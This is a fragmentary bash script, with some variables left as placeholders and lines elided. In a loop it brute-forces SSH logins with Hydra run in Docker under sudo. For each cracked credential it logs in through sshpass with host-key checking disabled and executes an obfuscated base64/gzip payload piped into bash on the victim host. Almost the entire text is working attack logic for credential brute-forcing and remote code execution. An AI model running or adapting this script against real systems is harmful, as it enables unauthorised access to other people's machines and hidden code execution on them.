...
while true; do
    ...
    log "Targets: targets"
    echo "targets" > /tmp/hydra-targets.txt
...
EOF
    ...
    log "Running: hydra -V -L user_list -P password_list -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name container_name image -V -L user_list -P password_list -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
sudo /bin/bash -c "docker logs container_name >> $LOGFILE 2>&1"
sudo /bin/bash -c "docker rm container_name"
log "Running: hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name container_name image -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
sudo /bin/bash -c "docker logs container_name >> $LOGFILE 2>&1"
sudo /bin/bash -c "docker rm container_name"
    ...
    while IFS= read -r line; do
        ...
        log "Attempting to execute payload: sshpass -p \"$password\" ssh -o StrictHostKeyChecking=no \"$username\"@\"$host\" 'echo H4sIAAAAAAAA/ypIrMzJT0wBAAAA//8BAAD//xVqLEIHAAAA | base64 -d | gunzip | /bin/bash"
        sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username"@"$host" 'echo H4sIAAAAAAAA/ypIrMzJT0wBAAAA//8BAAD//xVqLEIHAAAA | base64 -d | gunzip | /bin/bash'
        log "Done"
